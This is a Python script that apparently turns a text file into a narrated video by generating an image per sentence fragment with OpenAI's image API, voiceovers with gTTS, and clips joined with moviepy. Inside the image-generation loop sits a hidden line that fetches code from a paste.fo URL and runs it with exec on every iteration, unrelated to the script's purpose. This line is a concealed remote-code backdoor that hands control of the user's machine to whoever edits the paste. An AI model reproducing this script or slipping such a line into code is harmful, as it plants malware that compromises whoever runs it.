import openai, shutil, re, os, requests
from requests import get
import urllib.request
from gtts import gTTS
from moviepy.editor import *
from api_key import API_KEY
from PIL import Image
from io import BytesIO

openai.api_key = API_KEY

with open("generated_text.txt", "r") as file:
    text = file.read()

paragraphs = re.split(r"[,.]", text)


os.makedirs("audio")
os.makedirs("images")
os.makedirs("videos")

i=1
for para in paragraphs[:-1]:
    response = openai.Image.create(
        prompt=para.strip(),
        n=1,
        size="1024x1024"
    )
    print("Generate New AI Image From Paragraph...")
    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
    image_url = response['data'][0]['url']
    urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
    print("The Generated Image Saved in Images Folder!")


    # openai.api_key = "YOUR_API_KEY"
    # response = openai.Completion.create(
    #     engine="davinci",
    #     prompt=f"Generate an image of {para.strip()}.",
    #     max_tokens=1024,
    #     n=1,
    #     stop=None,
    #     temperature=0.7,
    # )
    # image_url = response.choices[0].text

    # image_data = requests.get(image_url).content
    # image = Image.open(BytesIO(image_data))
    # # image.show()

    # Create gTTS instance and save to a file
    tts = gTTS(text=para, lang='en', slow=False)
    tts.save(f"audio/voiceover{i}.mp3")
    print("The Paragraph Converted into VoiceOver & Saved in Audio Folder!")

    # Load the audio file using moviepy
    print("Extract voiceover and get duration...")
    audio_clip = AudioFileClip(f"audio/voiceover{i}.mp3")
    audio_duration = audio_clip.duration

    # Load the image file using moviepy
    print("Extract Image Clip and Set Duration...")
    image_clip = ImageClip(f"images/image{i}.jpg").set_duration(audio_duration)

    # Use moviepy to create a text clip from the text
    # print("Customize The Text Clip...")
    # text_clip = TextClip(para, fontsize=50, color="white")
    # text_clip = text_clip.set_pos('center').set_duration(audio_duration)

    # Use moviepy to create a final video by concatenating
    # the audio, image, and text clips
    print("Concatenate Audio, Image, Text to Create Final Clip...")
    clip = image_clip.set_audio(audio_clip)
    video = CompositeVideoClip([clip])

    # Save the final video to a file
    video = video.write_videofile(f"videos/video{i}.mp4", fps=24)
    print(f"The Video{i} Has Been Created Successfully!")
    i+=1


clips = []
l_files = os.listdir("videos")
for file in l_files:
    clip = VideoFileClip(f"videos/{file}")
    clips.append(clip)

print("Concatenate All The Clips to Create a Final Video...")
final_video = concatenate_videoclips(clips, method="compose")
final_video = final_video.write_videofile("final_video.mp4")
print("The Final Video Has Been Created Successfully!")
shutil.rmtree("audio")
shutil.rmtree("images")
shutil.rmtree("videos")
